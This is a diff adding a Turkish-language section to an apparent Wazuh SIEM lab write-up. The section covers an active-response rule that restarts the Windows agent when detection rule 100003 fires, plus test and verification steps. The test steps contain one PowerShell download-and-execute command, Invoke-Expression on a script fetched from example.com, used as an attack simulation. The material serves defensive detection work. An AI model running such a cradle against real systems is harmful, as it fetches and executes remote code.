@@ -98,3 +98,36 @@ MITRE ATT&CK çerçevesiyle eşleştirilmiş ve `/var/ossec/etc/rules/local_rule
   </rule>
 
 </group>
+
+
+
+⚡ Otomatik Müdahale (Active Response) Entegrasyonu
+Zararlı kod çalıştırma girişimi tespit edildiğinde insan müdahalesi beklenmeden uç noktada sürecin kesilmesi sağlanmıştır.
+
+Mühendislik & Analiz Notu (Kısıtların Çözümü):
+Kaynak IP Bağımlılığı (srcip): host-deny veya güvenlik duvarı engellemeleri log içinde srcip (Kaynak IP) bilgisine ihtiyaç duyar. Süreç oluşturma (Sysmon Event ID 1) loglarında IP bilgisi bulunmadığı için komut satırı tetiklemelerinde uç nokta servis müdahalesi tercih edilmiştir.
+
+İşletim Sistemi Betik Uyumluluğu: Windows uç noktalarında Linux kabuk betikleri (.sh) çalışmayacağı için Windows'a özel derlenmiş .exe executable araçları (restart-wazuh.exe) aktif edilmiştir.
+
+Uygulanan Active Response Konfigürasyonu (ossec.conf)
+XML
+<!-- Rule 100003 Tetiklendiğinde Agent Servisini Yeniden Başlatma -->
+<active-response>
+  <command>restart-wazuh</command>
+  <location>local</location>
+  <rules_id>100003</rules_id>
+</active-response>
+🧪 Test ve Doğrulama Adımları
+Saldırı Simülasyonu (Windows 10):
+
+PowerShell
+powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('[http://example.com/test](http://example.com/test)')"
+SIEM Paneli Doğrulaması:
+
+100003 numaralı kural tetiklendi ve Wazuh Dashboard üzerinde Level 10 kritikte alarm oluşturuldu.
+
+Active Response Doğrulaması:
+
+Target makine üzerindeki C:\Program Files (x86)\ossec-agent\active-response\active-responses.log dosyası incelendi.
+
+active-response/bin/restart-wazuh.exe: Starting kaydıyla otomatik müdahalenin başarıyla gerçekleştiği doğrulandı.
